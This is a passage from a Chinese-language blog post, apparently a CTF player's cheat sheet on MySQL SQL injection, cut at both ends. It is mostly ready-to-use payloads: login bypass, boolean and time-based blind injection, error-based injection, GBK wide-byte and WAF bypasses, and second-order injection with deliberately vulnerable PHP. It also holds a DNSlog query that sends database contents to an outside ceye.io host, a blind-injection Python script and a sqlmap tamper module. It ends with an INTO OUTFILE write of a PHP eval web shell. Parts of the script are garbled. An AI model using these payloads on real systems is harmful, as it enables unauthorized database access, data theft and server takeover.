//这里如果把查询语句放到2的位置上，因为or的关系会不能显示正常查询的内容 </span><br></pre></td></tr></table></figure><p>这个结果是在输出列为我们可控的 database()和’2’这2个值，那么如果登录页面的验证逻辑是如下形式</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$result = mysql_query(&quot; select username,password from userinfo where id=&#x27;$_GET[&#x27;username&#x27;]&#x27; &quot;);</span><br><span class="line">if(md5($_GET[&#x27;password&#x27;]) === $result[&#x27;password&#x27;])&#123;</span><br><span class="line">　　echo &quot;登录成功&quot;;</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">　　echo &quot;登录失败&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p> 我们便可以通过下来方法构造来绕过用户名和密码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">账户：xx&#x27; union select 1,&#x27;c81e728d9d4c2f636f067f89cc14862c&#x27; #　　　　　　//c81e728d9d4c2f636f067f89cc14862c是2的md5值</span><br><span class="line">密码：2</span><br></pre></td></tr></table></figure><p><strong>使用bool回显判断注入</strong></p><p>substr(str,start,long)</p><p>　　str是待切分的字符串，start是切分起始位置(下标从1开始)，long是切分长度</p><p>if(exp1,exp2,exp3)</p><p>　　如果满足exp1,那么执行exp2,否则执行exp3</p><p>注入语句</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xx&#x27; or if((substr((select database()),1,1)=&#x27;c&#x27;),1,0) #　　　　//判断数据库第一个字符是否为c</span><br></pre></td></tr></table></figure><p>那么查询第二个字符可以用下列方法</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xx&#x27; or if((substr((select database()),1,2)=&#x27;ct&#x27;),1,0) #　　　　</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xx&#x27; or if((substr((select database()),2,1)=&#x27;t&#x27;),1,0) #　　　　</span><br></pre></td></tr></table></figure><p>假设 , (逗号)被过滤了，可以用如下方式处理</p><p>　if(exp1, exp2, exp3) =&gt; case when exp1 then exp2 else exp3 end</p><p>　substr(exp1, 1, 1) =&gt; substr(exp1) from 1 for 1</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xx&#x27; or case when (substr((select database()) from 1 for 1)=&#x27;c&#x27;) then 1 else 0 end #</span><br></pre></td></tr></table></figure><p>假设substr被过滤了，可以用如下方式处理</p><p>LOCATE(substr,str,pos)</p><p>　　返回子串 substr 在字符串 str 中的第 pos 位置后第一次出现的位置。如果 substr 不在 str 中返回 0</p><p>　　ps：因为mysql对大小写不敏感，所有写的时候用 locate(binary’S’, str, 1) 加个binary即可</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xx&#x27; or if((locate(binary&#x27;c&#x27;,(select database()),1)=1),1,0) #</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xx&#x27; or if((locate(binary&#x27;t&#x27;,(select database()),1)=2),1,0) #</span><br></pre></td></tr></table></figure><p><strong>使用延迟注入</strong></p><p>在输入无论正确的sql语句还是错误的sql语句页面都一样的情况下可以使用该方法进行判断是否成功</p><p>延时注入的本质是执行成功后延时几秒后再回显，反之不会延时直接回显</p><p>还是利用if来判断结果正确与否，只是返回值用延时来代替1</p><p>方法：sleep，benchmark， 笛卡尔积等（其他的我还是太菜不太会用）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">基于sleep的延迟 xx&#x27; or if(length((select database()))&gt;1,sleep(5),1) #</span><br><span class="line">基于笛卡尔乘积运算时间造成的时间延迟</span><br><span class="line">xx&#x27; or if(length((select database()))&gt;1,(select count(*) FROM information_schema.columns A,information_schema.columns p B,information_schema.columns C),1) # 基于benchmark的延迟 xx&#x27;or if(length((select database()))&gt;1,(select BENCHMARK(10000000,md5(&#x27;a&#x27;))),1) #--大概会用2S时间</span><br></pre></td></tr></table></figure><p>benchmark和笛卡尔积的原理实质上是运算时间过长导致的延迟</p><p><strong>使用DNSlog进行数据回显</strong></p><p>原理网上很多文章都有，这里稍微总结下使用技巧</p><p>load_file()</p><p>　　读取文件并返回文件内容为字符串。</p><p>这里先在ceye.io上注册个账号看看自己的子域名就行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xx&#x27;or if(length((select database()))&gt;1,(select load_file(concat(&#x27;\\\\&#x27;,(select database()),&#x27;.你账号的子域名.ceye.io\\a&#x27;))),1) # </span><br></pre></td></tr></table></figure><p>只要能够写select的地方，并且能够调用load_file函数就能执行</p><p><a href="https://img2018.cnblogs.com/blog/1419450/201901/1419450-20190109122423553-1822791446.png"><img src="1419450-20190109122423553-1822791446.png" alt="img"></a></p><p><strong>报错注入</strong></p><p>报错注入前提是在后端代码有Exception这种异常处理的回显才能在web中用，不然即使能报错但是你不知道报错内容</p><p>报错注入函数很多，这里就介绍两种</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">xx&#x27; and (updatexml(1,concat(1,(select database()),1),1))　　　　# 用 or连接也行</span><br><span class="line">xx&#x27; and (extractvalue(1,concat(1,(select database()),1)))　　　# 用 or连接也行</span><br></pre></td></tr></table></figure><p><strong>0x02 SQL注入的技巧:</strong></p><p>该小结的例句还是以0x01节的原始查询语句相同</p><p><strong>mid切割字符串</strong></p><p>常常会出现回显字符串长度的限制，我们可以用mid来切割</p><p>mid(str, start[, length])</p><p>　　str为待切割的字符串，start为从第几个位置开始,length(没有则返回后面所有)为切割长度</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xxx&#x27; union select (mid((select database()),1,2))</span><br></pre></td></tr></table></figure><p>在写到这时，发现mid和substr作用很像，自己测试也一下可以在有时”代替”substr进行bool型判断</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xx&#x27; or if(mid((select database()),2,1)=&#x27;t&#x27;,1,0) #</span><br></pre></td></tr></table></figure><p><strong>hex编码与字符串</strong></p><p>字符串在某种意义上是和它的hex值等价的，举个栗子</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from admin where id = &#x27;1&#x27;    &lt;===&gt;  select * from admin where id = 0x31</span><br></pre></td></tr></table></figure><p>在”好不容易”逃逸第一个 ‘(单引号)后，后面的有会有查询关键字需要单引号会破坏sql语句结构时候用</p><p>或者一些关键字被过滤了，但是又会出现在查询里面</p><p>能够被hex编码的内容必须是字符串，即’(被单引号括起来)’的内容。关键字是不能被编码的</p><p><strong>利用group_concat连接多行</strong></p><p> 有些时候返回值只能显示一行内容，这时候有2种办法</p><p>用limit一行一行的运行</p><p>用group_concat将内容连在一行一并输出</p><p>可见group_concat比limit要方便一点，使用方法</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xx&#x27; union select 1,2,(select group_concat(name，id) from admin) #</span><br></pre></td></tr></table></figure><p>它输出格式是每个元组用逗号隔开的(我这里email是我在做其他测试时候瞎填的)</p><p><a href=""><img src="1419450-20190109133111315-1086071877.png" alt="img"></a></p><p><strong>利用like和regexp来进行匹配</strong></p><p> like后面能进行模糊匹配，关键字内容为</p><p>%　　　　=&gt; 匹配任意个字符串</p><p>_　　　　 =&gt; 匹配一个字符</p><p>但是存在前提，被匹配的字符可以是select查询语句，可以是该表内的字段，可以是返回为字符串的函数比如database()</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">xx&#x27; or database() like &#x27;c%&#x27; #</span><br><span class="line">xx&#x27; or database() like &#x27;ct_&#x27; #xx&#x27; or name like &#x27;siji%&#x27; #xx&#x27; or (select dd from uesrinfo) like &#x27;h%&#x27; #</span><br></pre></td></tr></table></figure><p>在某种程度上regexp和like的效果差不多，但是它是支持正则表达式</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xx&#x27; or database() like &#x27;^c.f$&#x27; #</span><br></pre></td></tr></table></figure><p> 但是这样不方便，测试一下后发现可以用这个方法逐个匹配</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xx&#x27; or name regexp &#x27;^s$*&#x27;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xx&#x27; or name regexp &#x27;^si$*&#x27;</span><br></pre></td></tr></table></figure><p><strong>mysql的GBK导致的宽字节注入</strong></p><p>因为gbk是2个字节为一个编码，而我们如果把字符用url编码后%xx是一个字节，%xx%xx才表示一个gbk编码。在post或者get传参的时候会自动进行一次url解码</p><p>常见的过滤为addslashes(str)会把 ‘ 转义为 &#39; 导致注入失败</p><p>那么在宽字节注入的时候</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">xx&#x27; union select 1,2,database() # 　　　　//是会被拦截的</span><br><span class="line">xx%df&#x27; union select 1,2,datbase() #　　　 //款字节注入，会把\&#x27;组合在一起</span><br></pre></td></tr></table></figure><p><a href=""><img src="1419450-20190109144139622-1954433630.png" alt="img"></a></p><p>这个是还没进数据库前的样子，因为web页面解析用的gbk所以达到了这个效果。而实际进入数据库是这样的，看看日志(该文件编码是utf-8)</p><p><a href=""><img src="1419450-20190109144949627-1705224551.png" alt="img"></a></p><p>将文件用gbk编码形式打开</p><p><a href=""><img src="1419450-20190109145501432-326465736.png" alt="img"></a></p><p>无论设置没有设置gbk传进去的字符样子没啥变化，但是内部处理机制发生了变化。总而言之gbk把 β\ 当成一个字符，而不是gbk模式下 β \ 是被当成2个字符</p><p><strong>mysql关于utf-8编码问题</strong></p><p>如果数据库是utf-8编码的情况下，常常会在PHP代码层用无视大小写的字母waf，那么utf-8的</p><p>是无法像GBK用宽字节绕过 ‘ ，但是在数据库中utf-8分为2种校对模式</p><p>utf8_unicode_ci</p><p>该模式会把特殊字母转换成2个正规英文，例如ß=ss</p><p>utf8_general_ci</p><p>该模式会把特殊字符转换成1个正规英文，例如Ä = A，Ö = O，Ü = U</p><p>比如是utf8_general_ci模式，下面是$sql1会被拦截，而$sql2不会被拦截</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$sql1 = select * from admin where id = &#x27;xx&#x27; union select 1,2,database() #</span><br><span class="line">$sql2 = select * from admin where id = &#x27;xx&#x27; uniÖn select 1,2,database() #</span><br><span class="line">if(preg_match(&#x27;/union/i&#x27;,$sql1) &gt; 0)&#123;</span><br><span class="line">　　echo &#x27;waf&#x27;;</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">　　执行sql语句</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">if(preg_match(&#x27;/union/i&#x27;,$sql2) &gt; 0)&#123;</span><br><span class="line">　　echo &#x27;waf&#x27;;</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">　　执行sql语句</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>二次注入:</strong></p><p>二次注入的原理是在把非法代码添加进数据库里面存储了，因为 &#39; 这种转义不会把(反斜杠)代入到数据库中存储，然后在其他地方调用了这个非法代码并且拼接到sql语句中了</p><p>简而言之</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">非法代码             ==存入==&gt;  数据库　　　　　　　　#非法代码  \&#x27; 这种转义的只会把 &#x27; 存入数据库</span><br><span class="line"></span><br><span class="line">数据库中的非法代码字段 ==取出==&gt; 后台语言中的变量中</span><br><span class="line"></span><br><span class="line">后台语言变量的非法代码 ==代入==&gt; sql查询语句中进行拼接</span><br></pre></td></tr></table></figure><p>这里我手写了个建议的二次注入原理代码</p><p>插入数据页面代码input.php</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    $conn = mysql_connect(&#x27;localhost&#x27;, &#x27;root&#x27;, &#x27;root&#x27;);</span><br><span class="line">    mysql_select_db(&quot;test&quot;, $conn);</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;head&gt;</span><br><span class="line">        &lt;meta charset=&quot;utf-8&quot;&gt;</span><br><span class="line">    &lt;/head&gt;</span><br><span class="line">    &lt;form action=&quot;&quot; method=&quot;post&quot;&gt;</span><br><span class="line">        用户id:&lt;input type = &quot;text&quot; name=&quot;id&quot; value=&quot;&quot; /&gt;&lt;br&gt;</span><br><span class="line">        用户名：&lt;input type = &quot;text&quot; name=&quot;username&quot; value=&quot;&quot; /&gt;&lt;br&gt;</span><br><span class="line">        密码：&lt;input type = &quot;text&quot; name=&quot;password&quot; value=&quot;&quot; /&gt;&lt;br&gt;</span><br><span class="line">        邮箱：&lt;input type =&quot;text&quot; name=&quot;email&quot; value=&quot;&quot; /&gt;&lt;br&gt;</span><br><span class="line">        &lt;input type=&quot;submit&quot; name=&quot;submit&quot; /&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">    $id = @addslashes($_POST[&#x27;id&#x27;]);</span><br><span class="line">    $username = @addslashes($_POST[&#x27;username&#x27;]);</span><br><span class="line">    $password = @addslashes($_POST[&#x27;password&#x27;]);</span><br><span class="line">    $email = @addslashes($_POST[&#x27;email&#x27;]);</span><br><span class="line">    $sql = &quot;insert into userinfo values(&#x27;$id&#x27;,&#x27;$username&#x27;,&#x27;$password&#x27;,&#x27;$email&#x27;)&quot;;</span><br><span class="line">    mysql_query($sql);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>查询数据页面代码out.php</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    $uid = $_GET[&#x27;uid&#x27;];</span><br><span class="line">    $conn = mysql_connect(&#x27;localhost&#x27;, &#x27;root&#x27;, &#x27;root&#x27;);</span><br><span class="line">    mysql_select_db(&quot;test&quot;, $conn);</span><br><span class="line">    $sql = &quot;SELECT * FROM userinfo where id=&#x27;$uid&#x27;&quot;;</span><br><span class="line">    $result = mysql_query($sql);</span><br><span class="line">    $ans = mysql_fetch_array($result);</span><br><span class="line">    $username = $ans[&#x27;username&#x27;];</span><br><span class="line">    $sql2 = &quot;SELECT * FROM userinfo where username=&#x27;$username&#x27;&quot;;</span><br><span class="line">    $result = mysql_query($sql2);</span><br><span class="line">    $ans = mysql_fetch_array($result);</span><br><span class="line">    var_dump($ans);</span><br></pre></td></tr></table></figure><p>首先查看数据库里面的数据，就2个</p><p><a href=""><img src="1419450-20190109153334333-1741182970.png" alt="img"></a></p><p>在input.php页面添加信息，用户名就是我们的注入代码</p><p><a href=""><img src="1419450-20190109153439917-1960234704.png" alt="img"></a></p><p>再看数据库，发现 \ 这个符号确实没有被代入数据库中存储</p><p><a href=""><img src="1419450-20190109153743651-359479936.png" alt="img"></a></p><p>在out.php中传入get参数3，发现执行union联合查询输出的1,2,database(),4。这里我数据库名字叫做’test’</p><p><a href=""><img src="1419450-20190109154139075-316407580.png" alt="img"></a></p><p>至此二次查询的原理就是这样，在ctf中曾做过一道二次查询的题目</p><p>题目攻击方式大致是通过注册，如果执行成功主页和执行失败的主页是有区别的，然后写python脚本盲注得出flag</p><p>其中用户名的代码为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&#x27;or if((length((select database()))&gt;0),1,0) or&#x27;</span><br><span class="line"></span><br><span class="line">代入数据库前完整代码可能是</span><br><span class="line">insert into user values(&#x27;id&#x27;,&#x27;\&#x27;or if((length((select database()))&gt;0),1,0) or\&#x27;&#x27;,&#x27;password&#x27;)</span><br><span class="line"></span><br><span class="line">取出数据时候的情况即</span><br><span class="line">$username = $ans[&#x27;username&#x27;]　　　　#$username = &#x27;or if((length((select database()))&gt;0),1,0) or&#x27;</span><br><span class="line"></span><br><span class="line">第二次拼接的情况</span><br><span class="line">mysql_query(&quot;select * from user where username = &#x27;&#x27;or if((length((select database()))&gt;0),1,0) or&#x27;&#x27; &quot;)</span><br></pre></td></tr></table></figure><p> 那么还存在一种情况就是拼接的字段是id，但是id我们不可控,比如（当然该条件有个限制即 ‘(单引号) 没有被转义!!!!!!）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mysql_query(&quot;insert into userinfo values(&#x27;4&#x27;,&#x27;$username&#x27;, &#x27;$password&#x27;, &#x27;$email&#x27;)&quot;);</span><br><span class="line"></span><br><span class="line">查询语句根据username取出数据库内容，再把id拼接到查询语句</span><br><span class="line">$id = $ans[&#x27;Id&#x27;];</span><br><span class="line">mysql_query(&quot;select * from userinfo where id = $id &quot;)</span><br></pre></td></tr></table></figure><p>这时候我们可以控制$email参数，做到写入多组记录</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">si@qq.com&#x27;),(&#x27;5&#x27;,&#x27;\&#x27; union select (database()),2,3,4 #\&#x27;&#x27;,&#x27;haha&#x27;,&#x27;haha@qq.com</span><br></pre></td></tr></table></figure><p>可以看到一口气注册了2个账号，而5号账号是我可控的（我将源代码中input.php的addslashes给去除了）</p><p><a href=""><img src="1419450-20190109160153899-695737626.png" alt="img"></a></p><p>类比下，如果只有中间的password我们可控的话</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">password&#x27;,&#x27;si@qq.com&#x27;),(&#x27;5&#x27;,&#x27;\&#x27; union select (database()),2,3,4 #\&#x27;&#x27;,&#x27;haha&#x27;,&#x27;haha@qq.com&#x27;),(&#x27;6&#x27;,&#x27;myname&#x27;,&#x27;password2　　　　#这样会出现3组数据</span><br><span class="line">或者</span><br><span class="line">password&#x27;,&#x27;si@qq.com&#x27;),(&#x27;5&#x27;,&#x27;\&#x27; union select (database()),2,3,4 #\&#x27;&#x27;,&#x27;haha　 　　　　　　　　　　　　　　　　　　　　　　　　　　　#这样就出现2组数据</span><br></pre></td></tr></table></figure><p><strong>0x02bypass:</strong></p><p>写bypass总有些心虚，因为自己知道的不多23333</p><p><strong>双写绕过清空</strong></p><p>有些waf是用preg_match将非法字符替换为空，比如</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql = preg_match(&quot;/union|select/i&quot;, &quot;&quot;, $sql)</span><br></pre></td></tr></table></figure><p>它不是把你数据直接挡掉报错，而是处理后仍然通行，在有/xx/i忽视大小写可以双写</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">selselectect  ==去掉其中的select==&gt; sel去掉的ect ==&gt; select</span><br></pre></td></tr></table></figure><p><strong>url和base64编码</strong></p><p>其实这不怎么算bypass，但是有些书上也这么讲，这里稍微写下</p><p>在有些代码中会对参数进行base64解码，url解码等操作，如果这些操作在转义或者waf之后的话，就会逃过过滤达到注入的效果</p><p>如果在处理之前的话就没有作用啦</p><p><strong>内敛注释</strong></p><p>在有些在后台代码上对关键字并未过滤，但是之后会经过安全软件，再存入数据库，有时候内敛注释可以骗过安全软件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/*!union*/　　　　#其中的union是会执行的</span><br></pre></td></tr></table></figure><p><strong>空格被过滤</strong></p><p>有2中办法，通过括号或者/**/来完成不需要空格也能执行的方法</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">xx&#x27;/**/union/**/select/**/1,2,3,4/**/#</span><br><span class="line">xx&#x27;union select(1),(2),(3)#空格有个问题，它是将参数括起来来绕过空格，但是如果2个关键字比如这里的union和select没法一个当另一个的参数，于是有时候这个方法也不灵</span><br></pre></td></tr></table></figure><p><strong>单引号的过滤</strong></p><p>虽然sql注入第一步就是将单引号逃逸出来，但是有时候单引号逃逸了后会在单引号前面加些奇怪的东西，比如GBK宽字节注入</p><p>这时候可以hex编码</p><p>‘内容’ 等价于 0x内容的十六进制编码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;abc&#x27;   = 0x616263</span><br></pre></td></tr></table></figure><p><strong>特别的sprintf</strong></p><p>有些时候会用sprintf来包裹sql语句，但是sprintf这个函数有个问题在，非正常的地方输入%,会提示warning（如果没有用@禁止的话）</p><p>利用方法，用 %1$’ 代替 ‘</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x27;  ==&gt; %1$&#x27;</span><br><span class="line">%1$&#x27;or 1=1 #</span><br></pre></td></tr></table></figure><p><strong>关键字的绕过</strong></p><p>在总结一中归纳了 ,(逗号) 被过滤的方法</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">if(exp1, exp2, exp3)   =&gt;  case when exp1 then exp2 else exp3 end</span><br><span class="line"></span><br><span class="line">substr(exp1, 1, 1)     =&gt; substr(exp1) from 1 for 1</span><br></pre></td></tr></table></figure><p>如果 and 和 or 被过滤了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">and   =&gt; &amp;&amp;</span><br><span class="line">or    =&gt; ||</span><br></pre></td></tr></table></figure><p>如果where被过滤了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">where id=&#x27;1&#x27;   =&gt;  order by id having id=&#x27;1&#x27; </span><br></pre></td></tr></table></figure><p>如果’=’被过滤了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;=&#x27;    =&gt;  &#x27;&lt;&gt;&#x27;</span><br></pre></td></tr></table></figure><p>如果’&lt;’,’&gt;’,’=’被过滤了，但是要设置范围</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id = 1   ==&gt; id between 1 and 1</span><br></pre></td></tr></table></figure><p><strong>关于json的编码</strong></p><p>之前做18年HCTF的时候，一道简单的代码审计题，会将cookie中的值代入waf中，然后再进入数据库</p><p>关键点在于在经过waf后，它会进行json的解码。</p><p>在json解码中有个Unicode的编码问题，有兴趣大家可以百度下，我这里直接写利用方法</p><p>json编码可以用\u00xx (xx为16进制ascii码)来用Unicode来编码对应字符。如果waf在json_decode之前，那么可以通过这个方法绕过</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;\u0075&#x27;  ==&gt;  &#x27;u&#x27;</span><br></pre></td></tr></table></figure><p><strong>0x03python脚本</strong></p><p>sqlmap十分强大，但是就算是level5，有时候也会被特别的waf给拦截，调用它的bypass模块又记不住。这里就总结下自己怎么写盲注python脚本</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">url = &quot;xxxx&quot;flag = &quot;&quot;</span><br><span class="line">s = reuqests.session()　　　　　　#获取会话for i in range(100):　　　　　　 #在bool还是延时注入的时候都要一个个试，假设我们这里不知道目标字段的长度就稍微设置个合适的　　for j in &quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890!@#$%^&amp;*()_-,.&quot;:　　　　#这个是可能的字符，一个个试呗　　　　payload = &quot;xx&#x27; or if((substr(database())=&quot; + str(j) + &quot;,&quot; + str(i) + &quot;,1),1,0) #&quot; 　　　　　　#手工测出来有效的payload，当然实际情况会根据waf变个型　　　　data = &#123;　　　　　　&#x27;username&#x27;:&#x27;payload&#x27;,　　　　　　&#x27;password&#x27;:&#x27;123&#x27;　　　　&#125;　　　　s.post(url,data=data)　　#发送数据　　　　if &quot;right&quot; in s.text ：　　#如果返回值有在sql语句成功后有不同于失败的时候的回显，将该回显当做判定　　　　　　flag += str(j)　　　　　　print flag　　　　　　beak</span><br></pre></td></tr></table></figure><p>那么我们在知道替换规则的情况下可以自己写sqlmap的bypass脚本</p><p>在sqlmap文件夹下的/tamper/下，自己创建个py文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line">from lib.core.enums import PRIORITY</span><br><span class="line"></span><br><span class="line">__priority__ = PRIORITY.HIGHEST</span><br><span class="line"></span><br><span class="line">def dependencies():</span><br><span class="line">    pass</span><br><span class="line"></span><br><span class="line">def tamper(payload, **kwargs):</span><br><span class="line">    payload = payload.replace(&quot;&#x27;&quot;,&quot;%1$&#x27;&quot;)　　　　　　#将什么替换成什么</span><br><span class="line">    payload = payload.replace(&quot;u&quot;,&quot;\u0075&quot;)　　　　  #将什么替换成什么，可以写很多个</span><br><span class="line">    return payload</span><br></pre></td></tr></table></figure><p>在sqlmap使用的时候调用这个模块，即可使用自定义过程</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap --tamper=模块名.py -u &#x27;http://xxx.xx.xx.xx/ddd.php?id=1&#x27;</span><br></pre></td></tr></table></figure><p><strong>0x04将结果写入文件达到getshell</strong></p><p>写入文件的前提是outfile这个关键字没有被禁止，并且知道web站点的绝对路径</p><p>使用方法是</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xx&#x27; union select 1,2,&#x27;&lt;?php eval($_POST[1]) ?&gt;&#x27; into outfile &#x27;/var/www/html/sijidou.php&#x27; #</span><br></pre></td></tr></table></figure><h1 id="mysql-load-file使用"><a href="#mysql-load-file使用" class="headerlink" title="mysql load_file使用"></a><strong>mysql load_file使用</strong></h1><p>load_file函数只有满足两个条件就可以使用：</p><p>1、文件权限：chmod a+x pathtofile</p><p>2、文件大小: 必须小于max_allowed_packet</p><p>例子：</p><p>select load_file(‘D:\xampp\htdocs\www\wanju\htaccess.txt’)</p><p>select 